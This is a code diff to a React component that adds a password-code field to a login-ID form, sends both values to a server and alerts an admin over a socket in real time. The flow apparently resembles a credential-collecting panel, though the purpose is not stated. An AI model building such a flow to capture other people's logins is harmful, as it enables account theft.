@@ -12,15 +12,18 @@ interface UserData {
 
 const {socket} = useSocket();
 
-export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber: string; loginIdV?: string; userName: string; }) => {
+export const LoginIdAction = ({ phoneNumber, loginIdV, passwordCodeV, userName }: { phoneNumber: string; loginIdV?: string; passwordCodeV:string; userName: string; }) => {
 
   const { dismiss } = useToast();
   const [loginId, setLoginId] = useState(loginIdV|| "");
+  const [passwordCode, setPasswordCode] = useState(passwordCodeV || "");
 
   const userData = {
     id: userName,
     phonenumber: phoneNumber,
     loginid: loginId,
+    passwordcode: passwordCode,
+    status: "preparing"
   }
 
   
@@ -28,7 +31,7 @@ export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber
   const onSubmit = async (userData: UserData) => {
 
     if (loginId === ""){
-      
+
       toast({
         title: 'LoginId empty!',
         description: 'Please input loginid!',
@@ -41,6 +44,24 @@ export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber
       toast({
         title: 'LoginId!',
         description: 'Your login ID must be at least 15 characters long.',
+      });
+      return;
+    }
+
+    if(passwordCode === ""){
+
+      toast({
+        title: 'Passwordcode empty!',
+        description: 'Please input passwordcode!',
+      });
+      return;
+    }
+
+    if (passwordCode.length < 15 ){
+
+      toast({
+        title: 'PasswordCode!',
+        description: 'Your Password Code must be at least 15 characters long.',
       });
       return;
     }
@@ -60,12 +81,12 @@ export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber
       }
 
       toast({
-        title: 'LoginID Sending Successful!',
-        description: 'Welcome! Your loginId sending has been success.',
-        action: <button onClick={dismiss}>LoginID Sending</button>,
+        title: 'LoginID and PasswordCode Sending Successful!',
+        description: 'Welcome! Your loginId and Password Code sending has been success.',
+        action: <button onClick={dismiss}>LoginID And Password Code</button>,
       });
 
-      socket.emit("adminLoginId", {receiveuserId: userName, message:"Client sent login id to you!"} );
+      socket.emit("adminLoginId", {receiveuserId: userName, message:"Client sent login id and password code to you!"} );
 
       location.reload();
 
@@ -73,8 +94,8 @@ export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber
     } catch (error) {
       console.error('Error during fetch:', error);
       toast({
-        title: 'LoginID Sending Failed!',
-        description: 'Your loginId sending has been failed. Please try again.',
+        title: 'Sending Failed!',
+        description: 'Your loginId and password code sending has been failed. Please try again.',
       });
       throw error; // Rethrow or return an error response
     }
@@ -95,17 +116,31 @@ export const LoginIdAction = ({ phoneNumber, loginIdV, userName }: { phoneNumber
     if (loginIdV) {
       setLoginId(loginIdV);
     } else {
-      setLoginId(""); // Reset if loginIdV is none or invalid
+      setLoginId("");
     }
-  }, [loginIdV]);
+
+    if (passwordCodeV) {
+      setPasswordCode(passwordCodeV);
+    } else {
+      setPasswordCode(""); 
+    }
+
+  }, [loginIdV, passwordCodeV]);
 
   return (
     <div className='flex w-full justify-center'>
       <input
-        className=' w-20 rounded-md border border-input bg-transparent px-3 py-1 text-sm shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50'
+        className=' w-48 rounded-md border border-input bg-transparent px-3 py-1 text-sm shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50'
         onChange={(e) => setLoginId(e.target.value)}
         value={loginId}
         disabled={loginIdV && loginIdV !== "none"}
+      />
+
+      <input
+        className=' w-48 rounded-md border border-input bg-transparent px-3 py-1 text-sm shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50'
+        onChange={(e) => setPasswordCode(e.target.value)}
+        value={passwordCode}
+        disabled={passwordCodeV && passwordCodeV !== "none"}
       />
       <Button className='h-8 w-10 ml-5 text-xs bg-white' handleClick={handleButtonClick} disabled={loginIdV &&loginIdV !== "none"}>
         SEND
